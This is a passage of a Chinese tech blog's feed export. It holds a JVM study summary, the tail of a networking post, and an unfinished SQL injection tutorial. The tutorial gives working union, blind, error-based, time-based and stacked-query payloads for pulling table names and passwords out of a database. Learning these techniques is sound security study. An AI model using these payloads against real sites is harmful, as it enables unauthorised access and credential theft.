    &lt;p&gt;首部校验和：计算IP头部的校验和，检查IP报头的完整性。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;源IP地址：标识IP数据报的源端设备。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;目的IP地址：标识IP数据报的目的地址。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">jvm总结</title><link href="http://localhost:4000/_posts/2020-07-17-jvm%E6%80%BB%E7%BB%93/" rel="alternate" type="text/html" title="jvm总结" /><published>2020-07-17T00:00:00-04:00</published><updated>2020-07-17T00:00:00-04:00</updated><id>http://localhost:4000/_posts/jvm%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-17-jvm%E6%80%BB%E7%BB%93/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;jvm-的主要组成部分&quot;&gt;JVM 的主要组成部分&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/img/jvm.png&quot; alt=&quot;jvm&quot; /&gt;&lt;/p&gt;

&lt;p&gt;JVM包含两个子系统和两个组件，两个子系统为Class loader(类装载)、Execution engine(执行引擎)；两个组件为Runtime data area(运行时数据区)、Native Interface(本地接口)。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Class loader(类装载)：根据给定的全限定名类名(如：java.lang.Object)来装载class文件到Runtime data area中的method area。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Execution engine（执行引擎）：执行classes中的指令。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Native Interface(本地接口)：与native libraries交互，是其它编程语言交互的接口。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Runtime data area(运行时数据区域)：这就是我们常说的JVM的内存&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作用 ：首先通过编译器把 Java 代码转换成字节码，类加载器（ClassLoader）再把字节码加载到内存中，将其放在运行时数据区（Runtime data area）的方法区内，而字节码文件只是 JVM 的一套指令集规范，并不能直接交给底层操作系统去执行，因此需要特定的命令解析器执行引擎（Execution Engine），将字节码翻译成底层系统指令，再交由 CPU 去执行，而这个过程中需要调用其他语言的本地库接口（Native Interface）来实现整个程序的功能&lt;/p&gt;

&lt;h1 id=&quot;java程序运行机制步骤&quot;&gt;Java程序运行机制步骤&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;首先利用IDE集成开发工具编写Java源代码，源文件的后缀为.java；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;再利用编译器(javac命令)将源代码编译成字节码文件，字节码文件的后缀名为.class；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;运行字节码的工作是由解释器(java命令)来完成的。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/img/java_run.png&quot; alt=&quot;java_run&quot; /&gt;&lt;/p&gt;

&lt;p&gt;的加载指的是将类的.class文件中的二进制数据读入到内存中，将其放在运行时数据区的方法区内，然后在堆区创建一个 java.lang.Class对象，用来封装类在方法区内的数据结构&lt;/p&gt;

&lt;h1 id=&quot;jvm-运行时数据区&quot;&gt;JVM 运行时数据区&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Java 虚拟机在执行 Java 程序的过程中会把它所管理的内存区域划分为若干个不同的数据区域&lt;/strong&gt;。这些区域都有各自的用途，以及创建和销毁的时间，有些区域随着虚拟机进程的启动而存在，有些区域则是依赖线程的启动和结束而建立和销毁。Java 虚拟机所管理的内存被划分为如下几个区域：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/数据区.png&quot; alt=&quot;数据区&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不同虚拟机的运行时数据区可能略微有所不同，但都会遵从 Java 虚拟机规范， Java 虚拟机规范规定的区域分为以下 5 个部分：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;程序计数器（Program Counter Register）：当前线程所执行的字节码的行号指示器，字节码解析器的工作是通过改变这个计数器的值，来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等基础功能，都需要依赖这个计数器来完成；&lt;/li&gt;
  &lt;li&gt;Java 虚拟机栈（Java Virtual Machine Stacks）：用于存储局部变量表、操作数栈、动态链接、方法出口等信息；&lt;/li&gt;
  &lt;li&gt;本地方法栈（Native Method Stack）：与虚拟机栈的作用是一样的，只不过虚拟机栈是服务 Java 方法的，而本地方法栈是为虚拟机调用 Native 方法服务的；&lt;/li&gt;
  &lt;li&gt;Java 堆（Java Heap）：Java 虚拟机中内存最大的一块，是被所有线程共享的，几乎所有的对象实例都在这里分配内存；&lt;/li&gt;
  &lt;li&gt;方法区（Methed Area）：用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译后的代码等数据。&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;深拷贝和浅拷贝&quot;&gt;深拷贝和浅拷贝&lt;/h1&gt;

&lt;p&gt;浅拷贝（shallowCopy）只是增加了一个指针指向已存在的内存地址，&lt;/p&gt;

&lt;p&gt;深拷贝（deepCopy）是增加了一个指针并且申请了一个新的内存，使这个增加的指针指向这个新的内存，&lt;/p&gt;

&lt;p&gt;使用深拷贝的情况下，释放内存的时候不会因为出现浅拷贝时释放同一个内存的错误。&lt;/p&gt;

&lt;p&gt;浅复制：仅仅是指向被复制的内存地址，如果原地址发生改变，那么浅复制出来的对象也会相应的改变。&lt;/p&gt;

&lt;p&gt;深复制：在计算机中开辟一块新的内存地址用于存放复制的对象。&lt;/p&gt;

&lt;h1 id=&quot;堆栈区别&quot;&gt;堆栈区别&lt;/h1&gt;

&lt;h2 id=&quot;物理地址&quot;&gt;物理地址&lt;/h2&gt;

&lt;p&gt;堆的物理地址分配对对象是不连续的。因此性能慢些。在GC的时候也要考虑到不连续的分配，所以有各种算法。比如，标记-消除，复制，标记-压缩，分代（即新生代使用复制算法，老年代使用标记——压缩）&lt;/p&gt;

&lt;p&gt;栈使用的是数据结构中的栈，先进后出的原则，物理地址分配是连续的。所以性能快。&lt;/p&gt;

&lt;h2 id=&quot;内存分别&quot;&gt;内存分别&lt;/h2&gt;

&lt;p&gt;堆因为是不连续的，所以分配的内存是在&lt;code&gt;运行期&lt;/code&gt;确认的，因此大小不固定。一般堆大小远远大于栈。&lt;/p&gt;

&lt;p&gt;栈是连续的，所以分配的内存大小要在&lt;code&gt;编译期&lt;/code&gt;就确认，大小是固定的。&lt;/p&gt;

&lt;h2 id=&quot;存放的内容&quot;&gt;存放的内容&lt;/h2&gt;

&lt;p&gt;堆存放的是对象的实例和数组。因此该区更关注的是数据的存储&lt;/p&gt;

&lt;p&gt;栈存放：局部变量，操作数栈，返回结果。该区更关注的是程序方法的执行&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;静态变量放在方法区&lt;/p&gt;

  &lt;p&gt;静态的对象还是放在堆&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;程序的可见度&quot;&gt;程序的可见度&lt;/h2&gt;

&lt;p&gt;堆对于整个应用程序都是共享、可见的。&lt;/p&gt;

&lt;p&gt;栈只对于线程是可见的。所以也是线程私有。他的生命周期和线程相同&lt;/p&gt;

&lt;h1 id=&quot;hotspot虚拟机对象&quot;&gt;HotSpot虚拟机对象&lt;/h1&gt;

&lt;h2 id=&quot;对象的创建&quot;&gt;对象的创建&lt;/h2&gt;

&lt;p&gt;说到对象的创建，首先让我们看看 &lt;code&gt;Java&lt;/code&gt; 中提供的几种对象创建方式：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Header&lt;/th&gt;
      &lt;th&gt;解释&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;new&lt;/td&gt;
      &lt;td&gt;调用了构造函数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;使用class的newInstance&lt;/td&gt;
      &lt;td&gt;调用了构造函数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;使用constructor类的newInstance&lt;/td&gt;
      &lt;td&gt;调用了构造函数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;使用clone&lt;/td&gt;
      &lt;td&gt;没有调用构造函数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;使用反序列化&lt;/td&gt;
      &lt;td&gt;没有调用构造函数&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;对象创建的主要流程:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;new Classs&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;类是否加载&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;分配内存&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;并发处理&lt;/p&gt;

    &lt;p&gt;CAS同步处理或者本地线程分配缓存&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;初始化&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;将分配的内存空间都初始化为0&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;init方法&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;虚拟机遇到一条new指令时，先检查常量池是否已经加载相应的类，如果没有，必须先执行相应的类加载。类加载通过后，接下来分配内存。若Java堆中内存是绝对规整的，使用“指针碰撞“方式分配内存；如果不是规整的，就从空闲列表中分配，叫做”空闲列表“方式。划分内存时还需要考虑一个问题-并发，也有两种方式: CAS同步处理，或者本地线程分配缓冲(Thread Local Allocation Buffer, TLAB)。然后内存空间初始化操作，接着是做一些必要的对象设置(元信息、哈希码…)，最后执行&lt;init&gt;方法&lt;/init&gt;&lt;/p&gt;

&lt;h2 id=&quot;为对象分配内存&quot;&gt;为对象分配内存&lt;/h2&gt;

&lt;p&gt;类加载完成后，接着会在Java堆中划分一块内存分配给对象。内存分配根据Java堆是否规整，有两种方式：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;指针碰撞：如果Java堆的内存是规整，即所有用过的内存放在一边，而空闲的的放在另一边。分配内存时将位于中间的指针指示器向空闲的内存移动一段与对象大小相等的距离，这样便完成分配内存工作。&lt;/li&gt;
  &lt;li&gt;空闲列表：如果Java堆的内存不是规整的，则需要由虚拟机维护一个列表来记录那些内存是可用的，这样在分配的时候可以从列表中查询到足够大的内存分配给对象，并在分配后更新列表记录&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;选择哪种分配方式是由 Java 堆是否规整来决定的，而 Java 堆是否规整又由所采用的垃圾收集器是否带有压缩整理功能决定。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/内存分配.png&quot; alt=&quot;内存分配&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;并发安全问题&quot;&gt;并发安全问题&lt;/h2&gt;

&lt;p&gt;对象的创建在虚拟机中是一个非常频繁的行为，哪怕只是修改一个指针所指向的位置，在并发情况下也是不安全的，可能出现正在给对象 A 分配内存，指针还没来得及修改，对象 B 又同时使用了原来的指针来分配内存的情况。解决这个问题有两种方案：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;对分配内存空间的动作进行同步处理（采用 CAS + 失败重试来保障更新操作的原子性）；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;把内存分配的动作按照线程划分在不同的空间之中进行，即每个线程在 Java 堆中预先分配一小块内存，称为本地线程分配缓冲（Thread Local Allocation Buffer, TLAB）。哪个线程要分配内存，就在哪个线程的 TLAB 上分配。只有 TLAB 用完并分配新的 TLAB 时，才需要同步锁。通过-XX:+/-UserTLAB参数来设定虚拟机是否使用TLAB&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/img/线程安全.png&quot; alt=&quot;线程安全&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;对象的访问定位&quot;&gt;对象的访问定位&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;Java&lt;/code&gt;程序需要通过 &lt;code&gt;JVM&lt;/code&gt; 栈上的引用访问堆中的具体对象。对象的访问方式取决于 &lt;code&gt;JVM&lt;/code&gt; 虚拟机的实现。目前主流的访问方式有 &lt;strong&gt;句柄&lt;/strong&gt; 和 &lt;strong&gt;直接指针&lt;/strong&gt; 两种方式&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;指针：&lt;/strong&gt; 指向对象，代表一个对象在内存中的起始地址。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;句柄：&lt;/strong&gt; 可以理解为指向指针的指针，维护着对象的指针。句柄不直接指向对象，而是指向对象的指针（句柄不发生变化，指向固定内存地址），再由对象的指针指向对象的真实内存地址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;句柄访问&quot;&gt;句柄访问&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;Java&lt;/code&gt;堆中划分出一块内存来作为&lt;strong&gt;句柄池&lt;/strong&gt;，引用中存储对象的&lt;strong&gt;句柄地址&lt;/strong&gt;，而句柄中包含了&lt;strong&gt;对象实例数据&lt;/strong&gt;与&lt;strong&gt;对象类型数据&lt;/strong&gt;各自的&lt;strong&gt;具体地址&lt;/strong&gt;信息，具体构造如下图所示&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/句柄访问.png&quot; alt=&quot;句柄访问&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;优势&lt;/strong&gt;：引用中存储的是&lt;strong&gt;稳定&lt;/strong&gt;的句柄地址，在对象被移动（垃圾收集时移动对象是非常普遍的行为）时只会改变&lt;strong&gt;句柄中&lt;/strong&gt;的&lt;strong&gt;实例数据指针&lt;/strong&gt;，而&lt;strong&gt;引用&lt;/strong&gt;本身不需要修改&lt;/p&gt;

&lt;h3 id=&quot;直接指针&quot;&gt;直接指针&lt;/h3&gt;

&lt;p&gt;如果使用&lt;strong&gt;直接指针&lt;/strong&gt;访问，&lt;strong&gt;引用&lt;/strong&gt; 中存储的直接就是&lt;strong&gt;对象地址&lt;/strong&gt;，那么&lt;code&gt;Java&lt;/code&gt;堆对象内部的布局中就必须考虑如何放置访问&lt;strong&gt;类型数据&lt;/strong&gt;的相关信息&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/直接指针.png&quot; alt=&quot;直接指针&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;优势&lt;/strong&gt;：速度更&lt;strong&gt;快&lt;/strong&gt;，节省了&lt;strong&gt;一次指针定位&lt;/strong&gt;的时间开销。由于对象的访问在&lt;code&gt;Java&lt;/code&gt;中非常频繁，因此这类开销积少成多后也是非常可观的执行成本。HotSpot 中采用的就是这种方式&lt;/p&gt;

&lt;h1 id=&quot;内存溢出异常&quot;&gt;内存溢出异常&lt;/h1&gt;

&lt;p&gt;内存泄漏是指不再被使用的对象或者变量一直被占据在内存中。理论上来说，Java是有GC垃圾回收机制的，也就是说，不再被使用的对象，会被GC自动回收掉，自动从内存中清除。&lt;/p&gt;

&lt;p&gt;但是，即使这样，Java也还是存在着内存泄漏的情况，java导致内存泄露的原因很明确：长生命周期的对象持有短生命周期对象的引用就很可能发生内存泄露，尽管短生命周期对象已经不再需要，但是因为长生命周期对象持有它的引用而导致不能被回收，这就是java中内存泄露的发生场景。&lt;/p&gt;

&lt;h1 id=&quot;java垃圾回收机制&quot;&gt;Java垃圾回收机制&lt;/h1&gt;

&lt;p&gt;在java中，程序员是不需要显示的去释放一个对象的内存的，而是由虚拟机自行执行。在JVM中，有一个垃圾回收线程，它是低优先级的，在正常情况下是不会执行的，只有在虚拟机空闲或者当前堆内存不足时，才会触发执行，扫面那些没有被任何引用的对象，并将它们添加到要回收的集合中，进行回收。&lt;/p&gt;

&lt;h1 id=&quot;gc&quot;&gt;GC&lt;/h1&gt;

&lt;p&gt;GC 是垃圾收集的意思（Gabage Collection）,内存处理是编程人员容易出现问题的地方，忘记或者错误的内存&lt;/p&gt;

&lt;p&gt;回收会导致程序或系统的不稳定甚至崩溃，Java 提供的 GC 功能可以自动监测对象是否超过作用域从而达到自动&lt;/p&gt;

&lt;p&gt;回收内存的目的，Java 语言没有提供释放已分配内存的显示操作方法&lt;/p&gt;

&lt;h1 id=&quot;垃圾回收的优点和原理&quot;&gt;垃圾回收的优点和原理&lt;/h1&gt;

&lt;p&gt;java语言最显著的特点就是引入了垃圾回收机制，它使java程序员在编写程序时不再考虑内存管理的问题。&lt;/p&gt;

&lt;p&gt;由于有这个垃圾回收机制，java中的对象不再有“作用域”的概念，只有引用的对象才有“作用域”。&lt;/p&gt;

&lt;p&gt;垃圾回收机制有效的防止了内存泄露，可以有效的使用可使用的内存。&lt;/p&gt;

&lt;p&gt;垃圾回收器通常作为一个单独的低级别的线程运行，在不可预知的情况下对内存堆中已经死亡的或很长时间没有用过的对象进行清除和回收。&lt;/p&gt;

&lt;p&gt;程序员不能实时的对某个对象或所有对象调用垃圾回收器进行垃圾回收。&lt;/p&gt;

&lt;p&gt;垃圾回收有分代复制垃圾回收、标记垃圾回收、增量垃圾回收。&lt;/p&gt;

&lt;h1 id=&quot;垃圾回收器的基本原理&quot;&gt;垃圾回收器的基本原理&lt;/h1&gt;

&lt;p&gt;对于GC来说，当程序员创建对象时，GC就开始监控这个对象的地址、大小以及使用情况。&lt;/p&gt;

&lt;p&gt;通常，GC采用有向图的方式记录和管理堆(heap)中的所有对象。通过这种方式确定哪些对象是”可达的”，哪些对象是”不可达的”。当GC确定一些对象为”不可达”时，GC就有责任回收这些内存空间。&lt;/p&gt;

&lt;p&gt;可以。程序员可以手动执行System.gc()，通知GC运行，但是Java语言规范并不保证GC一定会执行。&lt;/p&gt;

&lt;h1 id=&quot;java引用类型&quot;&gt;Java引用类型&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;强引用：发生 gc 的时候不会被回收。&lt;/li&gt;
  &lt;li&gt;软引用：有用但不是必须的对象，在发生内存溢出之前会被回收。&lt;/li&gt;
  &lt;li&gt;弱引用：有用但不是必须的对象，在下一次GC时会被回收。&lt;/li&gt;
  &lt;li&gt;虚引用（幽灵引用/幻影引用）：无法通过虚引用获得对象，用 PhantomReference 实现虚引用，虚引用的用途是在 gc 时返回一个通知&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;判断对象是否可以被回收&quot;&gt;判断对象是否可以被回收&lt;/h1&gt;

&lt;p&gt;垃圾收集器在做垃圾回收的时候，首先需要判定的就是哪些内存是需要被回收的，哪些对象是「存活」的，是不可以被回收的；哪些对象已经「死掉」了，需要被回收&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;引用计数器法：为每个对象创建一个引用计数，有对象引用时计数器 +1，引用被释放时计数 -1，当计数器为 0 时就可以被回收。它有一个缺点不能解决循环引用的问题；&lt;/li&gt;
  &lt;li&gt;可达性分析算法：从 GC Roots 开始向下搜索，搜索所走过的路径称为引用链。当一个对象到 GC Roots 没有任何引用链相连时，则证明此对象是可以被回收的。&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="jvm" /><summary type="html">[toc]</summary></entry><entry><title type="html">sql注入</title><link href="http://localhost:4000/_posts/2020-07-16-sql%E6%B3%A8%E5%85%A5/" rel="alternate" type="text/html" title="sql注入" /><published>2020-07-16T00:00:00-04:00</published><updated>2020-07-16T00:00:00-04:00</updated><id>http://localhost:4000/_posts/sql%E6%B3%A8%E5%85%A5</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-16-sql%E6%B3%A8%E5%85%A5/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;sql注入原理&quot;&gt;SQL注入原理&lt;/h1&gt;

&lt;p&gt;SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。（从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取你想到得到的资料）&lt;/p&gt;

&lt;h1 id=&quot;sql注入的位置&quot;&gt;&lt;strong&gt;SQL注入的位置&lt;/strong&gt;&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;表单提交，主要是POST请求，也包括GET请求；&lt;/li&gt;
  &lt;li&gt;URL参数提交，主要为GET请求参数；&lt;/li&gt;
  &lt;li&gt;Cookie参数提交；&lt;/li&gt;
  &lt;li&gt;HTTP请求头部的一些可修改的值，比如Referer、User_Agent等；&lt;/li&gt;
  &lt;li&gt;一些边缘的输入点，比如.mp3文件的一些文件信息等。&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;sql注入漏洞常见类型&quot;&gt;SQL注入漏洞常见类型&lt;/h1&gt;

&lt;h2 id=&quot;union注入攻击&quot;&gt;union注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;判断是get型还是post型注入；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;找到正确的闭合规则；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;order by 查询字段数；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;union select 1,2…..查看显示位是第几位，没有的话就试试把id=1的显示位让出来，让其等于id=-1；&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/img/sqli.png&quot; alt=&quot;sqli&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;二、三位显示出来了，那么即可在这两个位置写入sql语句；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询当前数据库,当前mysql用户 union select 1,user(),database()；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询当前数据库里面的表 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”data_name”;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询到敏感表名user，继续查询表里面的字段 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”user”;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查询字段，例如“id”、”passwd”的内容 union select 1,id,passwd from user;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;拿到用户、密码登入后台。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;boolean注入攻击-布尔盲注&quot;&gt;Boolean注入攻击-布尔盲注&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;查看现象，能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，只存在两种状态，对或错；&lt;/li&gt;
  &lt;li&gt;由页面的两种不同返回的状态来判定我们的闭合规则；&lt;/li&gt;
  &lt;li&gt;为了方便，我们这里假设返回正确用“yes”，返回错误用“no”来表示这两种状态&lt;/li&gt;
  &lt;li&gt;找到闭合规则后，我们在闭合规则里面 and 1=1 和 and 1=2 测试一下，看看最后返回是不是两种状态；&lt;/li&gt;
  &lt;li&gt;布尔盲注要用到length()和substr()语句，用两种状态来猜解数据库、表名等的长度和正确字母；&lt;/li&gt;
  &lt;li&gt;先用 and length(database())&amp;gt;2 来猜数据库的长度，使用的是二分法；&lt;/li&gt;
  &lt;li&gt;再用 and substr(database(),1,1)=’t’ 来确定第一个字母，可用burp跑，26个字母,哪个字母返回yes则代表第一个字母就是它；&lt;/li&gt;
  &lt;li&gt;and substr(database(),2,1)=’t’ 代表当前数据库的第二个字母；&lt;/li&gt;
  &lt;li&gt;最后结合长度，成功的将数据库猜解出来；&lt;/li&gt;
  &lt;li&gt;后面的操作跟union注入的步骤差不多了，只是sql语句写在 上文的 database() 处。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;报错注入攻击&quot;&gt;报错注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;只要注入点有sql报错信息，那么就可以使用报错注入；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;还是一样，引号报错，然后找到闭合规则，页面正常显示，则可以在闭合规则中开始写入报错注入的sql语句；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;updatexml报错获取当前数据库：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;and updatexml(1,concat(0x7e,(select database()),0x7e),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;floor报错获取当前数据库&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;两种方式都可行，如果第一个不行就试试第二个&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;接着可以利用select语句替换掉上面database()来继续获取数据库中的表名、字段名，查询语句和union注入攻击的语句相同；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;只不过这里不能再使用group_concat了，因为报错注入只显示一条结果，所以需要使用limit语句；&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;时间注入攻击-时间盲注&quot;&gt;时间注入攻击-时间盲注&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;没有明确的现象，不管是对是错都返回一个状态；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;但是如果用sleep(5)方法，能让响应时间延迟为5秒以上，那么就为时间盲注；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;我们用sleep(5)函数构造了一个时间延时的状态，因此，我们又有了两种状态，像布尔盲注一样可以根据这两种状态来判定数据库、表名和字段名的长度和正确的每个字母；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;同样的找到正确的闭合规则，当然，这个闭合规则得配合着 and sleep(5)语句来构造，哪一个闭合规则执行了sleep(5)，那么就是正确得闭合规则；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;时间盲注配合着 if(A,B,C) 语句结合使用，含义是：如果A是 true，则返回B（也就是执行B），否则返回C（执行C）；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;那么判断当前数据库名的长度的语句为：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;if (length(database())&amp;gt;1,sleep(5),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;就是说如果数据库长度大于1，那么响应延时5秒，否则执行select 1(也就是不延时)，由此来推出数据库长度。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;判断当前数据库名的第一个和第二个字母的语句：&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;if(substr(database(),1,1)='s',sleep(5),1)
if(substr(database(),2,1)='s',sleep(5),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;只有第一个字母等于26个字母中正确的字母时，才会延时5秒，因此可以通过burp或者sqlmap来跑。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;根据数据库名长度以此内推即可得出完整的数据库的库命、表名、字段名和具体内容。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;堆叠查询注入攻击&quot;&gt;堆叠查询注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;可以使用堆叠注入的地方也可以使用布尔盲注与时间盲注；&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;同样先找出正确的闭合规则，然后也看两种状态来猜解库名、表名等；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;堆叠注入的语句为&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;;select if(length(database())&amp;gt;1,sleep(3),1)
;select if(substr(database(),1,1)='r',sleep(3),1)
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;按照原理来说，分号后面可以执行新sql语句，但是很多时候没必要，如果遇到其他注入方法（或者绕过方式）不行的情况下可以试试这个注入方式；不是很常用。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;二次注入攻击&quot;&gt;二次注入攻击&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;二次注入一共有两个url，url一用来注入，也就是注入点，插入sql语句的地方，另外一个url用来返回信息；&lt;/li&gt;
  &lt;li&gt;也就是url一插入了sql语句，url一的响应里面就会返回这条信息对应的id值，然后url二就传入这个新id值，然后访问，响应回来之后将会爆出sql语句查询的结果，正确或者错误的sql信息；&lt;/li&gt;
